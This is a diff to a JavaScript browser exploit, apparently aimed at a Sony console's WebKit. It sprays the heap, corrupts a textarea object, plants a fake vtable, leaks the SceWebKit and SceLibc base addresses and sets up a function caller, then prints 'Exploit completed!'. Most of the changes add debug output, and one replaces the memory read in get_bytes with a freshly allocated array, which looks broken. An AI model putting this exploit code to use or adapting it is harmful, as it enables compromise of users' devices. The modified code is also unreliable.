@@ -36,15 +36,24 @@ function imm_movx(ins)
 */
 function get_bytes(aspace, addr, len)
 {
+		//document.write("</br> _____ get_bytes called DONE");
     var retbuf = "";
+    	//document.write("</br> _____ get_bytes var retbuf created DONE");
 	var hex = 0x0;
+		//document.write("</br> _____ get_bytes var hex created DONE");
+	var smithsf0x = new Uint8Array(big);
+		//document.write("</br> _____ get_bytes var sf created DONE");
     for (var i = 0; i < len; i++) {
-        hex = aspace[addr + i].toString(16);
+    		//document.write("</br> _____ get_bytes into for loop DONE");
+
+        hex = smithsf0x[addr + i].toString(16);
+        	//document.write("</br> _____ get_bytes hex = aspace . to string DONE");
         if(hex.length == 1){
             hex = "0" + hex;
         }
         retbuf = retbuf + hex;
     }
+    	//document.write("</br> _____ get_bytes should return DONE");
     return retbuf;
 }
 
@@ -65,22 +74,35 @@ function swap32(val)
 */
 function get_base_from_offsets(landmark, entry_off, base_off)
 {
+		//document.write("</br> get_base_from_offsets called");
     var entryaddr = landmark + entry_off;
+    	//document.write("</br> get_base_from_offsets variable entry created DONE");
     var entry = get_bytes(aspace, entryaddr, 4);
+    	//document.write("</br> get_base_from_offsets get_bytes entry DONE");
     entry = parseInt(entry, 16);
+    	//document.write("</br> get_base_from_offsets parseInt entry DONE");
     entry = swap32(entry);
+    	//document.write("</br> get_base_from_offsets swap32 entry DONE");
     var movw = get_bytes(aspace, entry, 4);
+    	//document.write("</br> get_base_from_offsets get_bytes movw DONE");
     movw = parseInt(movw, 16);
+    	//document.write("</br> get_base_from_offsets parseInt movw DONE");
     movw = swap32(movw);
+    	//document.write("</br> get_base_from_offsets swap32 movw DONE");
     movw = imm_movx(movw);
+    	//document.write("</br> get_base_from_offsets imm_movx movw DONE");
     var movt = get_bytes(aspace, entry + 4, 4);
+    	//document.write("</br> get_base_from_offsets get_bytes movt DONE");
     movt = parseInt(movt, 16);
+    	//document.write("</br> get_base_from_offsets parseInt movt DONE");
     movt = swap32(movt);
+    	//document.write("</br> get_base_from_offsets swap32 movt DONE");
     movt = imm_movx(movt);
+    	//document.write("</br> get_base_from_offsets imm_movx movt DONE");
 
     var ptr = ((movt << 16) | movw) >>> 0;
     var base = ptr - base_off;
-
+    	//document.write("</br> get_base_from_offsets should return");
     return base;
 } 
 
@@ -430,7 +452,9 @@ function MemoryHole()
 
 		aspace32[(vtidx) / 4] = fkvtable;
 
+		document.write("</br> //% Reload page if scelibcbase can not be created %// ");
 		document.write("</br> Creating scelibcbase : ");
+		document.write()
 		var scelibcbase = get_base_from_offsets(scewkbase, offsets.scelibcentry_off, offsets.scelibcbase_off);
 		document.write("   DONE");
 
@@ -440,19 +464,33 @@ function MemoryHole()
 		document.write("</br>");document.write("SceLibc base: 0x" + scelibcbase.toString(16));
 		document.write("</br>");document.write("-------------------------------------------------");
 
+		document.write("</br> Creating bases : ");
 		var bases = {
 			"SceWebKit": scewkbase,
 			"SceLibc": scelibcbase
 		};
+		document.write("   DONE");
 
+		document.write("</br> Creating tmpmem (allocating memory() : ");
 		var tmpmem = allocate_memory(0x5000);
-		caller = get_caller(tmpmem, corrupted_textarea, vtidx, fkvtable, version);
-		libraries = init_ggts(bases, caller, version);
+		document.write("   DONE");
 
-		var t = libraries.SceLibc.functions.time(0);
-		document.write("</br>");document.write("Time: " + t);
+		document.write("</br> Creating caller (get_caller) : ");
+		caller = get_caller(tmpmem, corrupted_textarea, vtidx, fkvtable, version);
+		document.write("   DONE");
+
+		document.write("</br> Creating libraries (init_ggts) : ");
+		libraries = init_ggts(bases, caller, version);
+		document.write("   DONE");
+
+		//document.write("</br> Creating t (SceLibc time functions) : ");
+		//var t = libraries.SceLibc.functions.time(0);
+		//document.write("   DONE");
+
+		//document.write("</br>");document.write("Time: " + t);
 		
 		document.write("</br>");document.write("Exploit completed!\n");
+		document.write(" <- without SceLibc.functions.time(0) !!!1!!elf </br>")
 
 		return aspace;
 	
@@ -468,7 +506,7 @@ var tries = 0;
 function spray()
 {
     ++tries;
-    document.write("Attempt #" + tries + "<br>");
+    //document.write("Attempt #" + tries + "<br>");
     if (tries > 10)
         crash();
 
@@ -500,7 +538,7 @@ function spray()
 		}
         newarrays = undefined;
         latest = undefined;
-        document.write("Success!");
+        document.write("Success! After Attempt  #" + tries);
 
         aspace = new Uint8Array(big);
         aspace16 = new Uint16Array(big);
